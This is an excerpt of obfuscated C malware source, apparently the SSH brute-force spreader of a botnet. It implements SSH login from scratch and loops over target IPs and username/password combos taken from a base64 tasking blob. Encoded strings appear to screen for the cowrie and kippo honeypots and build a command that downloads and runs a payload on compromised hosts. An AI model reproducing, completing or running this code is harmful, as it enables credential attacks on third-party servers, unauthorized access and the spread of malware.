...
static int _dU6Up5e(uint8_t *buf) {
    int pos = 0;
    int i;
    const char *kex_alg = _S(131,);
    const char *host_key = _S(19,0xdf,0xdf,0xc4,0x81,0xde,0xdf,0xcd,0x80,0xdf,0xdf,0xc4,0x81,0xc9,0xc8,0x9e,0x99,0x99,0x9d,0x95);
    const char *cipher = _S(21,0xcd,0xc9,0xdf,0x9d,0x9e,0x94,0x81,0xcf,0xd8,0xde,0x80,0xcd,0xc9,0xdf,0x9e,0x99,0x9a,0x81,0xcf,0xd8,0xde);
    const char *mac = _S(23,0xc4,0xc1,0xcd,0xcf,0x81,0xdf,0xc4,0xcd,0x9e,0x81,0x9e,0x99,0x9a,0x80,0xc4,0xc1,0xcd,0xcf,0x81,0xdf,0xc4,0xcd,0x9d);
    const char *comp = _S(4,0xc2,0xc3,0xc2,0xc9);
    const char *lang = "";
...
static kex_algo_t ssh_select_kex(const uint8_t *server_kexinit, int len) {
    ...
    if (_Cq8Hn7J(namelist, _S(17,0xcf,0xd9,0xde,0xda,0xc9,0x9e,0x99,0x99,0x9d,0x95,0x81,0xdf,0xc4,0xcd,0x9e,0x99,0x9a)))
        return KEX_CURVE25519_SHA256;
    if (_Cq8Hn7J(namelist, _S(28,0xcf,0xd9,0xde,0xda,0xc9,0x9e,0x99,0x99,0x9d,0x95,0x81,0xdf,0xc4,0xcd,0x9e,0x99,0x9a,0xec,0xc0,0xc5,0xce,0xdf,0xdf,0xc4,0x82,0xc3,0xde,0xcb)))
        return KEX_CURVE25519_SHA256;
    if (_Cq8Hn7J(namelist, _S(29,0xc8,0xc5,0xca,0xca,0xc5,0xc9,0x81,0xc4,0xc9,0xc0,0xc0,0xc1,0xcd,0xc2,0x81,0xcb,0xde,0xc3,0xd9,0xdc,0x9d,0x98,0x81,0xdf,0xc4,0xcd,0x9e,0x99,0x9a)))
        return KEX_DH_GROUP14_SHA256;
    if (_Cq8Hn7J(namelist, _S(27,0xc8,0xc5,0xca,0xca,0xc5,0xc9,0x81,0xc4,0xc9,0xc0,0xc0,0xc1,0xcd,0xc2,0x81,0xcb,0xde,0xc3,0xd9,0xdc,0x9d,0x98,0x81,0xdf,0xc4,0xcd,0x9d)))
        return KEX_DH_GROUP14_SHA1;
    if (_Cq8Hn7J(namelist, _S(26,0xc8,0xc5,0xca,0xca,0xc5,0xc9,0x81,0xc4,0xc9,0xc0,0xc0,0xc1,0xcd,0xc2,0x81,0xcb,0xde,0xc3,0xd9,0xdc,0x9d,0x81,0xdf,0xc4,0xcd,0x9d)))
...
static int _ms4KB8R(_Rz8vk8z *c) {
    ...
    /* 2. Read server banner */
    {
        ...
        sbanner[slen] = '\0';
        if (strncmp((char*)sbanner, _S(8,0xff,0xff,0xe4,0x81,0x9e,0x82,0x9c,0x81), 8) != 0) return -1;
...
#undef HASH_STRING
    ...
    /* 8b. Detect cipher from server KEXINIT */
    {
        ...
        { int off128 = coff;
          c->cipher_256 = _Cq8Hn7J((const char *)(server_kexinit + coff + 4), _S(10,0xcd,0xc9,0xdf,0x9d,0x9e,0x94,0x81,0xcf,0xd8,0xde)) ? 0 : 1;
          (void)off128; }
    }
    ...
    /* 11. Request ssh-userauth service */
    {
        uint8_t sreq[64];
        int spos = 0;
        const char *svc = _S(12,0xdf,0xdf,0xc4,0x81,0xd9,0xdf,0xc9,0xde,0xcd,0xd9,0xd8,0xc4);
...
static int _yC5xh5B(_Rz8vk8z *c, const char *user, const char *pass) {
    ...
    { uint8_t extra[8]={0}; if (_LZ4Bb7E(c,user,_S(14,0xdf,0xdf,0xc4,0x81,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0xc5,0xc3,0xc2),_S(20,0xc7,0xc9,0xd5,0xce,0xc3,0xcd,0xde,0xc8,0x81,0xc5,0xc2,0xd8,0xc9,0xde,0xcd,0xcf,0xd8,0xc5,0xda,0xc9),extra,8)<0) return -1; }
...
static int _CC2fp3F(_Rz8vk8z *c, const char *user, const char *pass) {
    ...
    { uint8_t extra[260]; int ep=0;
      ...
      if (_LZ4Bb7E(c,user,_S(14,0xdf,0xdf,0xc4,0x81,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0xc5,0xc3,0xc2),_S(8,0xdc,0xcd,0xdf,0xdf,0xdb,0xc3,0xde,0xc8),extra,ep)<0) return -1; }
    ...
    if (payload[0]==SSH_MSG_USERAUTH_FAILURE && rlen>5) {
        ...
        if (mlen>0 && 5+(int)mlen<=rlen) {
            ...
            if (strstr(methods,_S(20,0xc7,0xc9,0xd5,0xce,0xc3,0xcd,0xde,0xc8,0x81,0xc5,0xc2,0xd8,0xc9,0xde,0xcd,0xcf,0xd8,0xc5,0xda,0xc9)))
...
static int _nD6dS8V(_Rz8vk8z *c, const char *cmd) {
    ...
    const char *ctype = _S(7,0xdf,0xc9,0xdf,0xdf,0xc5,0xc3,0xc2);
    uint32_t ctype_len = 7;
    const char *req = _S(4,0xc9,0xd4,0xc9,0xcf);
    uint32_t req_len = 4;
...
static int _Cb5rB3s(_Rz8vk8z *c, const char *url, int clean) {
    ...
    const char *tail = clean
        ? _S(66,0x97,0x8c,0xde,0xc1,0x8c,0x81,0xca,0x8c,0x82,0xc8,0x85,0x97,0x8c,0xc4,0xc5,0xdf,0xd8,0xc3,0xde,0xd5,0x8c,0x81,0xcf,0x8c,0x9e,0x92,0x83,0xc8,0xc9,0xda,0x83,0xc2,0xd9,0xc0,0xc0,0x97,0x8c,0x92,0x8c,0xd2,0x83,0x82,0xce,0xcd,0xdf,0xc4,0xf3,0xc4,0xc5,0xdf,0xd8,0xc3,0xde,0xd5,0x8c,0x9e,0x92,0x83,0xc8,0xc9,0xda,0x83,0xc2,0xd9,0xc0,0xc0)
        : _S(56,0x85,0x97,0x8c,0xc4,0xc5,0xdf,0xd8,0xc3,0xde,0xd5,0x8c,0x81,0xcf,0x8c,0x9e,0x92,0x83,0xc8,0xc9,0xda,0x83,0xc2,0xd9,0xc0,0xc0,0x97,0x8c,0x92,0x8c,0xd2,0x83,0x82,0xce,0xcd,0xdf,0xc4,0xf3,0xc4,0xc5,0xdf,0xd8,0xc3,0xde,0xd5,0x8c,0x9e,0x92,0x83,0xc8,0xc9,0xda,0x83,0xc2,0xd9,0xc0,0xc0);
    char cmd[4096];
    int pos = 0;
    int d, first = 1;
    ...
    for (d = 0; d < (int)(sizeof(dirs)/sizeof(dirs[0])); d++) {
        ...
        if (!first)
            pos += snprintf(cmd + pos, sizeof(cmd) - (size_t)pos, _S(4,0x8c,0xd0,0xd0,0x8c));
        first = 0;
        pos += snprintf(cmd + pos, sizeof(cmd) - (size_t)pos,
            _S(132,),
...
static int _qP4pj8f(_Rz8vk8z *c) {
    ...
    n = _Rz2Pm4g(c, _S(8,0xd9,0xc2,0xcd,0xc1,0xc9,0x8c,0x81,0xcd), resp, (int)sizeof(resp));
    if (n > 5 && strncmp(resp, _S(6,0xe0,0xc5,0xc2,0xd9,0xd4,0x8c), 6) == 0) {
        if (_CF4Xg7k(resp, _S(6,0xcf,0xc3,0xdb,0xde,0xc5,0xc9)) || _CF4Xg7k(resp, _S(5,0xc7,0xc5,0xdc,0xdc,0xc3)) ||
            _CF4Xg7k(resp, _S(5,0xdf,0xda,0xde,0x9c,0x98)))
            return 0;
        uname_ok = 1;
    }
    ...
    n = _Rz2Pm4g(c,
        _S(125,0xcf,0xcd,0xd8,0x8c,0x83,0xdc,0xde,0xc3,0xcf,0x83,0xda,0xc9,0xde,0xdf,0xc5,0xc3,0xc2,0x8c,0x9e,0x92,0x83,0xc8,0xc9,0xda,0x83,0xc2,0xd9,0xc0,0xc0,0x97,0x8c,0xc9,0xcf,0xc4,0xc3,0x8c,0x81,0x81,0x81,0x97,0x8c,0xcf,0xcd,0xd8,0x8c,0x83,0xdc,0xde,0xc3,0xcf,0x83,0x9d,0x83,0xcf,0xc1,0xc8,0xc0,0xc5,0xc2,0xc9,0x8c,0x9e,0x92,0x83,0xc8,0xc9,0xda,0x83,0xc2,0xd9,0xc0,0xc0,0x97,0x8c,0xc0,0xdf,0x8c,0x83,0xc3,0xdc,0xd8,0x83,0xcf,0xc3,0xdb,0xde,0xc5,0xc9,0x8c,0x83,0xc4,0xc3,0xc1,0xc9,0x83,0xcf,0xc3,0xdb,0xde,0xc5,0xc9,0x8c,0x83,0xc4,0xc3,0xc1,0xc9,0x83,0xc7,0xc5,0xdc,0xdc,0xc3,0x8c,0x9e,0x92,0x83,0xc8,0xc9,0xda,0x83,0xc2,0xd9,0xc0,0xc0),
        resp, (int)sizeof(resp));
    if (n > 0) {
        if (_CF4Xg7k(resp, _S(7,0xd8,0xdb,0xc5,0xdf,0xd8,0xc9,0xc8)) || _CF4Xg7k(resp, _S(6,0xcf,0xc3,0xdb,0xde,0xc5,0xc9)) ||
            _CF4Xg7k(resp, _S(11,0x83,0xc4,0xc3,0xc1,0xc9,0x83,0xc7,0xc5,0xdc,0xdc,0xc3)))
            return 0;
        if (!uname_ok && _CF4Xg7k(resp, _S(13,0xe0,0xc5,0xc2,0xd9,0xd4,0x8c,0xda,0xc9,0xde,0xdf,0xc5,0xc3,0xc2)))
            uname_ok = 1;
    }
    ...
    n = _Rz2Pm4g(c,
        _S(106,0xce,0xd9,0xdf,0xd5,0xce,0xc3,0xd4,0x8c,0xe9,0xef,0xe4,0xe3,0xf8,0xe9,0xff,0xf8,0x8c,0x9e,0x92,0x83,0xc8,0xc9,0xda,0x83,0xc2,0xd9,0xc0,0xc0,0x8c,0xd0,0xd0,0x8c,0x83,0xce,0xc5,0xc2,0x83,0xce,0xd9,0xdf,0xd5,0xce,0xc3,0xd4,0x8c,0xe9,0xef,0xe4,0xe3,0xf8,0xe9,0xff,0xf8,0x8c,0x9e,0x92,0x83,0xc8,0xc9,0xda,0x83,0xc2,0xd9,0xc0,0xc0,0x8c,0xd0,0xd0,0x8c,0x83,0xd9,0xdf,0xde,0x83,0xce,0xc5,0xc2,0x83,0xce,0xd9,0xdf,0xd5,0xce,0xc3,0xd4,0x8c,0xe9,0xef,0xe4,0xe3,0xf8,0xe9,0xff,0xf8,0x8c,0x9e,0x92,0x83,0xc8,0xc9,0xda,0x83,0xc2,0xd9,0xc0,0xc0),
        resp, (int)sizeof(resp));
    if (n > 0 && _CF4Xg7k(resp, _S(16,0xcd,0xdc,0xdc,0xc0,0xc9,0xd8,0x8c,0xc2,0xc3,0xd8,0x8c,0xca,0xc3,0xd9,0xc2,0xc8)))
        return 1;
...
static void _jk8sS4D(const char *b64_payload) {
    ...
    _nS5PJ8Y(_S(45,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xcf,0xc4,0xc5,0xc0,0xc8,0x96,0x8c,0xc8,0xc9,0xcf,0xc3,0xc8,0xc5,0xc2,0xcb,0x8c,0xdc,0xcd,0xd5,0xc0,0xc3,0xcd,0xc8,0x8c,0x84,0x89,0xd6,0xd9,0x8c,0xce,0xd5,0xd8,0xc9,0xdf,0x8c,0xce,0x9a,0x98,0x85), strlen(b64_payload));
    raw = _rr5LH7D(b64_payload);
    if (db_len(&raw) == 0) {
        _nS5PJ8Y(_S(36,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xcf,0xc4,0xc5,0xc0,0xc8,0x96,0x8c,0xc8,0xc9,0xcf,0xc3,0xc8,0xc9,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8,0x80,0x8c,0xcd,0xce,0xc3,0xde,0xd8,0xc5,0xc2,0xcb));
        db_free(&raw); _exit(1);
    }
    _nS5PJ8Y(_S(30,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xcf,0xc4,0xc5,0xc0,0xc8,0x96,0x8c,0xc8,0xc9,0xcf,0xc3,0xc8,0xc9,0xc8,0x8c,0x89,0xd6,0xd9,0x8c,0xce,0xd5,0xd8,0xc9,0xdf), db_len(&raw));
    ...
    int clean = (strstr(data, _S(9,0xa6,0xef,0xe0,0xe9,0xed,0xe2,0x96,0x9d,0xa6))      != NULL) || (strncmp(data, _S(8,0xef,0xe0,0xe9,0xed,0xe2,0x96,0x9d,0xa6),      8)  == 0);
    int no_hp = (strstr(data, _S(13,0xa6,0xe2,0xe3,0xe4,0xfc,0xef,0xe4,0xe9,0xef,0xe7,0x96,0x9d,0xa6)) != NULL) || (strncmp(data, _S(12,0xe2,0xe3,0xe4,0xfc,0xef,0xe4,0xe9,0xef,0xe7,0x96,0x9d,0xa6), 12) == 0);

    /* Extract payload section before strtok mangles everything.
       Format: ...combos...\n===\npayload_command_here */
    {
        char *marker = strstr(data, _S(5,0xa6,0x91,0x91,0x91,0xa6));
        if (marker) {
    ...
    /* Parse: MODE:xxx\nIP\nIP\n---\nuser:pass\n... */
    line = strtok(data, _S(1,0xa6));
    while (line) {
        while (*line == ' ' || *line == '\r') line++;
        if (!*line) { line = strtok(NULL, _S(1,0xa6)); continue; }

        if (strncmp(line, _S(5,0xe1,0xe3,0xe8,0xe9,0x96), 5) == 0) {
            if (strstr(line + 5, _S(7,0xdc,0xcd,0xd5,0xc0,0xc3,0xcd,0xc8))) mode_payload = 1;
        } else if (strcmp(line, _S(3,0x81,0x81,0x81)) == 0) {
            section = 1;
        } else if (section == 0) {
        ...
        line = strtok(NULL, _S(1,0xa6));
    }

    _nS5PJ8Y(_S(50,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xcf,0xc4,0xc5,0xc0,0xc8,0x96,0x8c,0xdc,0xcd,0xde,0xdf,0xc9,0xc8,0x8c,0x89,0xc8,0x8c,0xd8,0xcd,0xde,0xcb,0xc9,0xd8,0xdf,0x80,0x8c,0x89,0xc8,0x8c,0xcf,0xc3,0xc1,0xce,0xc3,0xdf,0x80,0x8c,0xc1,0xc3,0xc8,0xc9,0x91,0x89,0xdf),
              ntargets, ncombos, mode_payload ? _S(7,0xdc,0xcd,0xd5,0xc0,0xc3,0xcd,0xc8) : _S(6,0xde,0xc9,0xdc,0xc3,0xde,0xd8));
    SSH_DBG("loaded %d targets, %d combos, mode=%s, payload=%s", ntargets, ncombos,
            mode_payload ? _S(7,0xdc,0xcd,0xd5,0xc0,0xc3,0xcd,0xc8) : _S(6,0xde,0xc9,0xdc,0xc3,0xde,0xd8),
            payload_cmd ? payload_cmd : _S(6,0x84,0xc2,0xc3,0xc2,0xc9,0x85));

    if (ntargets == 0 || ncombos == 0) {
        _nS5PJ8Y(_S(43,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xcf,0xc4,0xc5,0xc0,0xc8,0x96,0x8c,0xc2,0xc3,0x8c,0xd8,0xcd,0xde,0xcb,0xc9,0xd8,0xdf,0x8c,0xc3,0xde,0x8c,0xcf,0xc3,0xc1,0xce,0xc3,0xdf,0x80,0x8c,0xcd,0xce,0xc3,0xde,0xd8,0xc5,0xc2,0xcb));
        db_free(&raw); _exit(1);
    }
    ...
    for (ti = 0; ti < ntargets; ti++) {
        ...
        _nS5PJ8Y(_S(30,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xcf,0xc4,0xc5,0xc0,0xc8,0x96,0x8c,0xf7,0x89,0xc8,0x83,0x89,0xc8,0xf1,0x8c,0xd8,0xcd,0xde,0xcb,0xc9,0xd8,0x8c,0x89,0xdf), ti + 1, ntargets, ip);
        ...
        for (ci = 0; ci < ncombos; ci++) {
            ...
            if (result == 1) {
                ...
                _nS5PJ8Y(_S(27,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xcf,0xc4,0xc5,0xc0,0xc8,0x96,0x8c,0x89,0xdf,0x8c,0xe4,0xe5,0xf8,0x8c,0xb8,0x8c,0x89,0xdf,0x96,0x89,0xdf), ip, combos_user[ci], combos_pass[ci]);
                ...
                if (mode_payload && payload_cmd) {
                    const char *url_pos = strstr(payload_cmd, _S(4,0xc4,0xd8,0xd8,0xdc));
                    if (url_pos) {
    ...
    _nS5PJ8Y(_S(67,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xcf,0xc4,0xc5,0xc0,0xc8,0x96,0x8c,0xdf,0xcf,0xcd,0xc2,0x8c,0xcf,0xc3,0xc1,0xdc,0xc0,0xc9,0xd8,0xc9,0x8c,0xb8,0x8c,0x89,0xc8,0x8c,0xd8,0xcd,0xde,0xcb,0xc9,0xd8,0xdf,0x8c,0x84,0xdf,0xc7,0xc5,0xdc,0x91,0x89,0xc8,0x8c,0xc4,0xdc,0x91,0x89,0xc8,0x8c,0xc4,0xdc,0xf3,0xdc,0xde,0xc3,0xce,0xc9,0x91,0x89,0xc8,0x85),
...
void kh8hL4N(const char *b64_payload, _EA8up4M *parent_conn) {
    ...
    pid_t pid;
    (void)parent_conn;
    _nS5PJ8Y(_S(37,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xc5,0xc2,0xc5,0xd8,0x96,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc5,0xc2,0xcb,0x8c,0x84,0xcf,0xd9,0xde,0xde,0xc9,0xc2,0xd8,0x8c,0xdc,0xc5,0xc8,0x91,0x89,0xc8,0x85), _bj8XN2t);
    if (_bj8XN2t > 0) {
        _nS5PJ8Y(_S(36,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xc5,0xc2,0xc5,0xd8,0x96,0x8c,0xcd,0xc0,0xde,0xc9,0xcd,0xc8,0xd5,0x8c,0xde,0xd9,0xc2,0xc2,0xc5,0xc2,0xcb,0x8c,0x84,0xdc,0xc5,0xc8,0x91,0x89,0xc8,0x85), _bj8XN2t);
        return;
    }
    ...
    if (pid > 0) {
        ...
        _nS5PJ8Y(_S(45,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xc5,0xc2,0xc5,0xd8,0x96,0x8c,0xca,0xc3,0xde,0xc7,0xc9,0xc8,0x8c,0xcf,0xc4,0xc5,0xc0,0xc8,0x8c,0xdc,0xc5,0xc8,0x91,0x89,0xc8,0x80,0x8c,0xde,0xc9,0xdc,0xc3,0xde,0xd8,0xf3,0xca,0xc8,0x91,0x89,0xc8), pid, _SV2eW7e);
        return;
    }
    ...
    _nS5PJ8Y(_S(35,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xcf,0xc4,0xc5,0xc0,0xc8,0x96,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc5,0xc2,0xcb,0x8c,0x84,0xdb,0xde,0xc5,0xd8,0xc9,0xf3,0xca,0xc8,0x91,0x89,0xc8,0x85), ssh_write_fd);
    _jk8sS4D(b64_payload);
    _nS5PJ8Y(_S(30,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xcf,0xc4,0xc5,0xc0,0xc8,0x96,0x8c,0xca,0xc5,0xc2,0xc5,0xdf,0xc4,0xc9,0xc8,0x80,0x8c,0xc9,0xd4,0xc5,0xd8,0xc5,0xc2,0xcb));
    _exit(0);
}

void Ss3vb6a(void) {
    _nS5PJ8Y(_S(24,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xc7,0xc5,0xc0,0xc0,0x96,0x8c,0xdc,0xc5,0xc8,0x91,0x89,0xc8,0x8c,0xca,0xc8,0x91,0x89,0xc8), _bj8XN2t, _SV2eW7e);
    if (_bj8XN2t > 0) {
        kill(_bj8XN2t, 9);
        _bj8XN2t = 0;
    }
